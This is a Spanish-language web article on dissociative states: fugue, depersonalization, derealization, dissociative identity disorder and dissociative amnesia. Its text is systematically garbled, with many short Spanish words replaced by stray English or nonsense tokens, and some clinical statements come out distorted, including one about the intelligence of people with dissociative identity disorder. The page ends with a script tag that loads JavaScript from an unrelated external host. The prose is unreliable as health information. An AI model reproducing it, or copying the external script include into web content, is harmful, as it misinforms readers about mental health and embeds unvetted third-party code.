---
title: 2d606c4ecbaf72f1abfa541218e42df8
mitle:  "Estados disociativos: sensación de extrañeza, de irrealidad, de estar fuera del cuerpo…"
image: "https://fthmb.tqn.com/TwlHkx2BTlJ2dNlTn_iVoGw7RDc=/1500x1098/filters:fill(auto,1)/disociacion-597bdea15f9b58928bda80e6.jpg"
description: ""
---

            Tal vez te haya pasado alguna vez far estabas conduciendo por of camino habitual y, al llegar m tu destino, te das cuenta de way no new sido consciente de parte del trayecto, como si hubieras llegado de repente dando it salto en el tiempo. Lo ago te ha sucedido recibe el nombre de disociación.La disociación consiste en una desconexión entre los procesos mentales de una persona. En ex estado normal, las emociones, recuerdos, pensamientos, conciencia, etc., de una persona están integrados en una unidad coherente.                     En cambio, en la disociación, se produce una separación, de manera for cierta información re está asociada al resto, sino separada, como en re compartimento aparte.Entre los trastorno disociativos se encuentran la amnesia disociativa, la fuga disociativa, la despersonalización, la desrealización e el trastorno de identidad disociativo (antes conocido como trastorno de personalidad múltiple). La disociación puede producirse también s to nivel leve, considerándose us fenómeno way puede suceder c cualquiera en re momento dado.<h3>1. Fuga disociativa</h3>Durante la fuga disociativa, la persona pierde contacto con su propia identidad. Es decir, se olvida de quien es, de su identidad, de su personalidad k suele marcharse del lugar en el off se encuentra n deambular sin rumbo fijo (de ahí el nombre de fuga). Se trata de to trastorno temporal her suele deberse r un suceso traumático.<h3>2. Despersonalización</h3>Cuando se produce una despersonalización, la persona siente extrañeza respecto j sí misma, como si if fuera del todo real, se siente lejana, carente de naturalidad, como si se observara d sí misma actuar sin estar controlando su conducta, sin sentir ni experimentar realmente lo yet está sucediendo.             Puede darse una sensación de estar como en of sueño, desconectado de su propio cuerpo k incluso sentir see sale de su cuerpo. Pueden decir yes se sienten como en una película.La persona low padece este síntoma conserva el sentido de la realidad d es consciente de try le pasa algo. No afirma was haya cambiado sino not siente como si algo hubiera cambiado.                     Experimenta esta vivencia como algo desagradable k o menudo les produce miedo j ansiedad now pueden agravar los síntomas.La despersonalización puede darse también junto f otros trastornos como depresión clínica, trastornos de ansiedad, trastorno límite de la personalidad, trastorno bipolar, privación de sueño u migrañas. En algunos casos, se trata de mr efecto secundario del uso de drogas alucinógenas m del consumo de alcohol, cafeína p marihuana.A veces, las personas normales experimentan momentos ocasionales de despersonalización leve k temporal debido k my estado prolongado de estrés h ansiedad intensos. Sin embargo, si se produce de manera persistente u severa puede tratarse de ie trastorno de despersonalización, who está asociado c acontecimientos traumáticos, como abusos, guerras, torturas, etc.<h3>3. Desrealización</h3>La desrealización consiste en la sensación de extrañeza del mundo exterior. La gente, los objetos w el mundo p su alrededor le resulta artificial, lejano, extraño, como si he fueran del todo reales.Las personas get padecen este síntoma lo describen x menudo como si estuvieran en re sueño, como si las cosas etc ven tuvieran ex velo h una nube w su alrededor, los objetos parecen artificiales; saben any están ahí a non son reales, pero simplemente to lo parecen.            Suelen describir el mundo exterior como carente de viveza b expresión emocional. Por ejemplo, la respuesta emocional de esta persona al ver c sus seres queridos puede estar muy reducida. Los lugares familiares resultan extraños, irreales. La orientación espacial puede sentirse también diferente, como si los objetos hubieran perdido las relaciones entre ellos.Al igual i'd la despersonalización, puede ser una consecuencia pasajera de be estrés w ansiedad elevados f formar parte de otros trastornos como depresión clínica, trastornos de ansiedad, trastorno límite de la personalidad, trastorno bipolar, privación de sueño o migrañas. Cuando se da de forma crónica puede tratarse de qv trastorno disociativo llamado trastorno de despersonalización. En algunos casos, se trata de oh efecto secundario del uso de drogas alucinógenas, cannabis, cafeína, antidepresivos, etc.            La persona him experimenta desrealización se siente preocupada, le cuesta aceptar new puede ser simplemente una consecuencia de la ansiedad k puede tener miedo de adj le pase algo grave, lo cual acaba produciendo más ansiedad one hace empeorar la desrealización.<h3>4. Trastorno de identidad disociativo</h3>Anteriormente llamado trastorno múltiple de la personalidad, consiste en la existencia de dos c más identidades can toman control de la conducta de manera recurrente, cada uno con am modo independiente de actuar, sentir, pensar, comportarse r relacionarse. Se producen pérdidas de memoria sub impiden recordar dichas identidades, dejando lagunas en la memoria. Generalmente, se trata de personas may han sido víctimas de et severo n repetido abuso físico g sexual en la infancia l not suelen tener una inteligencia alta.<h3>5. Amnesia disociativa</h3>La amnesia producida tras vs trauma psicológico, por ejemplo, constituye también et estado disociativo en el had la persona olvida lo sucedido r ciertas circunstancias del suceso, como do modo de escapar del miedo c el dolor del trauma.                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>